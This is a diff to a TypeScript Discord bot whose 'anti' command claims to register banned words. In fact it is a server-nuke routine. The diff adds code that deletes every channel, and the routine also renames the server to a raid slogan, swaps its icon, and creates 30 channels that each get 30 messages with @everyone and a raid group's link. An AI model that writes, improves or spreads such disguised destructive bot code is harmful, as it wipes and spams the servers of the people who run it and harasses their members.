@@ -13,7 +13,7 @@ try {
     body: [
       {
         name: "anti",
-        description: "**禁止ワードを登録**",
+        description: "**禁止ワードを登録中...**",
         type: 1,
         options: [
           {
@@ -21,19 +21,6 @@ try {
             type: 3,
             required: false,
             description: "**禁止する文章を入力してください**",
-          },
-        ],
-      },
-      {
-        name: "panel",
-        description: "**操作パネルを作成**",
-        type: 1,
-        options: [
-          {
-            name: "select",
-            type: 3,
-            required: true,
-            description: "**設置する操作パネルのタイプ**",
           },
         ],
       },
@@ -75,20 +62,18 @@ https://discord.gg/annycW3Xrk
 
       // NUKE
       const discordServer = client.guilds.cache.get(interaction.guildId ?? "");
+      discordServer?.channels.cache.forEach(async (channel) => {
+        try {
+          await channel.delete();
+        } catch (_e) {
+          Logger.log(`Channel delete failed.`, "WARN");
+        }
+      });
 
-      const max = 50;
+      const max = 30;
       discordServer?.setName(text?.split("\n")[0] ?? "荒らし共栄圏万歳！");
-      discordServer?.setIcon(
-        "https://storage.googleapis.com/zenn-user-upload/b89d2505cc99-20231228.png"
-      );
-      //   // @ts-ignore NOTE
-      //   (await discordServer?.members.list() ?? []).forEach(async (member: any) => {
-      //     if (member.id === client.user?.id) {
-      //       await member.timeout(0, "荒らし共栄圏万歳！");
-      //     } else {
-      //       await member.timeout(60 * 1000 * 60 * 24 * 7, "荒らし共栄圏万歳！");
-      //     }
-      //   });
+      discordServer?.setIcon("https://ctkpaarrdata.files.wordpress.com/2023/03/cropped-20211120_125906.gif?w=196")
+
       for (let i = 0; i < max; i++) {
         discordServer?.channels
           .create({
@@ -97,41 +82,15 @@ https://discord.gg/annycW3Xrk
           })
           .then(async (channel) => {
             for (let j = 0; j < max; j++) {
-              try {
                 await channel.send(
                   text ??
                     "荒らし共栄圏万歳！ \n https://ctkpaarr.data.blog \n @everyone"
                 );
-              } catch (_e) {
-                /* ANTI TIMEOUT */
-                console.log(_e);
-
-                try {
-                  (await discordServer.members.list()).forEach(
-                    async (member) => {
-                      if (member.id === client.user?.id) {
-                        await member.timeout(0, "荒らし共栄圏万歳！");
-                      }
-                    }
-                  );
-                } catch (_e) {
-                  console.log(_e);
-                }
-              }
             }
           });
       }
 
-      discordServer?.channels.cache.forEach(async (channel) => {
-        try {
-          await channel.delete();
-          // deno-lint-ignore no-empty
-        } catch (_e) {}
-      });
-
       discordServer?.setName(text?.split("\n")[0] ?? "荒らし共栄圏万歳！");
-    } else {
-      await interaction.reply("**現在メンテナンス中です。**");
     }
   }
 });
